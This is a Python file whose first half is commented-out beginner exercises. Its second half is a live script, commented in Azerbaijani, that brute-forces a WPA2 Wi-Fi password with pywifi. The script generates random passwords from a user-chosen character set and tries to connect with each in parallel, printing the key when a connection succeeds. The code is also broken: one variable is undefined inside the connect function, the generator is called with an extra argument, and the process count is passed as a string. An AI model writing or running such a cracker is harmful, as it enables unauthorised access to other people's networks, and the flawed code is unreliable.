# print("hello world")

# import sys

# print(sys.version)

# if 5>2:
#    print("five greater than two")

#    y=5
#    x=3
#    print(x+y)

# x=str(3)
# y=int(3)
# z=float(3)

# x, y, z = "Orange", "Banana", "Cherry"
# x = y = z = "Orange"

# print(x,y,z)

# x = "awesome"

# def myfunc():
#   x = "fantastic"
# print("Python is " + x)

# myfunc()

# print("Python is " + x)
# x = bytearray(5)
# x = memoryview(bytes(5))
# x = None
# x = range(6)
# x = {"name" : "John", "age" : 36}
# x = {"apple", "banana", "cherry"}
# x = frozenset({"apple", "banana", "cherry"})
# print(x)

# x = 1    # int
# y = 2.8  # float
# z = 1j   # complex

# #convert from int to float:
# a = float(x)

# #convert from float to int:
# b = int(y)

# #convert from int to complex:
# c = complex(x)

# print(a)
# print(b)
# print(c)

# print(type(a))
# print(type(b))
# print(type(c))

# import random

# print(random.randrange(1, 40))

from pywifi import PyWiFi, const, Profile
import time
import random
import string
from multiprocessing import Pool

# Bu funksiyanı hər bir təsadüfi parolayı yoxlamaq üçün istifadə edirik
def try_connect(password):
    wifi = PyWiFi()  # PyWiFi obyektini yaradın
    iface = wifi.interfaces()[0]  # Wi-Fi interfeysini seçin (ilk interfeysi seçir)
    iface.disconnect()  # Mövcud əlaqəni kəsirik
    time.sleep(1)  # Bir saniyə gözləyirik ki, əlaqə kəsilsin

    profile = Profile()  # Wi-Fi profilini yaradın
    profile.ssid = whifi_name # Wi-Fi şəbəkə adı
    profile.auth = const.AUTH_ALG_OPEN  # Açıq əlaqə üsulu
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # WPA2-PSK təhlükəsizlik növü
    profile.cipher = const.CIPHER_TYPE_CCMP  # CCMP şifrələmə üsulu
    profile.key = password  # Gözlənilən parolayı daxil edirik

    iface.remove_all_network_profiles()  # Bütün mövcud şəbəkə profillərini silirik
    tmp_profile = iface.add_network_profile(profile)  # Yaradılan profili əlavə edirik

    iface.connect(tmp_profile)  # Bu profil ilə əlaqə qururuq
    time.sleep(2)  # 2 saniyə gözləyirik ki, əlaqə qurulsun

    if iface.status() == const.IFACE_CONNECTED:  # Əgər əlaqə qurulubsa
        print("Parola tapıldı:", password)  # Tapılmış parolayı çap edirik
        iface.disconnect()  # Əlaqəni kəsirik
        time.sleep(1)  # Bir saniyə gözləyirik ki, əlaqə tam kəsilsin
        return True  # Parola tapıldı, True qaytarırıq
    return False  # Parola tapılmadı, False qaytarırıq

# Seçilmiş simvollardan təsadüfi parolalar yaratmaq üçün funksiyanı yazırıq
def generate_custom_passwords(selected_characters, password_length=8,whifi_name="AYXAN"):
    while True:  # Sonsuz dövr, hər dəfə yeni təsadüfi parolalar yaradır
        password = ''.join(random.choice(selected_characters) for _ in range(password_length))  # Təsadüfi parol
        yield password  # Yeni parolayı qaytarır

if __name__ == "__main__":
    # İstifadəçinin seçdiyi simvolları daxil edir
    selected_characters = input("Yoxlanılacaq simvolları daxil edin (məsələn, 'abc123'): ")

    whifi_name=input("Wifi name daxil edin:")

    prosessed=input("Dovr sayi:")

    # Parola uzunluğunu seçmək (default olaraq 8 simvol)
    password_length = int(input("Parolanın uzunluğunu daxil edin (default 8): ") or 8)

    print("Təsadüfi seçilmiş simvollardan parolalar yoxlanılır...")

    # Paralel işləmə ilə yoxlama (4 prosess ilə)
    with Pool(processes=prosessed) as pool:  # Burada 4 prosess paralel işləyəcək
        result = pool.map(try_connect, generate_custom_passwords(selected_characters, password_length,whifi_name, prosessed))  # Təsadüfi parolaları yoxlayırıq
        
        # Tapılan parolayı qaytarmaq
        if True in result:  # Əgər nəticələrdən birində True varsa, tapıldı deməkdir
            print("Parola tapıldı!")
        else:
            print("Heç bir parolaya qoşulmaq mümkün olmadı.")
